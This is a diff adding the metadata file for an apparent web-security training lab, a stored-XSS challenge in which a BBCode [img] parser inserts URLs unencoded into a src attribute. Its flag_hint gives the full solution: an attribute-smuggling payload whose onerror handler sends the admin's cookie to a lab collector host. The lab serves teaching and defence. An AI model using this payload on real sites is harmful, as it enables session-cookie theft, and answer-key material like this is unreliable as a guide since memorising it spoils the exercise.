@@ -1,0 +1,45 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "bbcode-parser-img-attribute-smuggling",
+  "title": "Stored XSS via BBCode [img] Attribute Smuggling",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 35,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise HTML-attribute context as distinct from element context: escaping < and > is not enough when a value lands inside an attribute value",
+    "Exploit a markup renderer that HTML-escapes surrounding text but inserts a captured URL raw into a src attribute, letting a double quote break out into new attributes",
+    "Craft an [img] attribute-smuggling payload that opens an onerror handler which fires on image load — no click or submit required",
+    "Understand the stored, attacker != victim shape: you post a topic; the admin bot renders it on a page you cannot load yourself",
+    "Exfiltrate the admin's non-HttpOnly session cookie to an OOB collector and identify HTML-attribute encoding as the root fix"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["stored-xss-comment-plain"],
+  "flag_hint": "POST /topics {\"body\":\"[img]x\\\" onerror=\\\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\\\"[/img]\"}; the raw [img] URL breaks out of src into an onerror that fires when the admin bot renders GET /admin/topics. Read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "hand-rolled BBCode [img] parser (unencoded src attribute)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "stored-xss",
+    "bbcode",
+    "attribute-injection",
+    "html-attribute-context",
+    "onerror",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "Classic phpBB/vBulletin-era BBCode [img] attribute-injection XSS, re-platformed to Flask for local Docker with a Playwright victim bot and an OOB collector"
+}
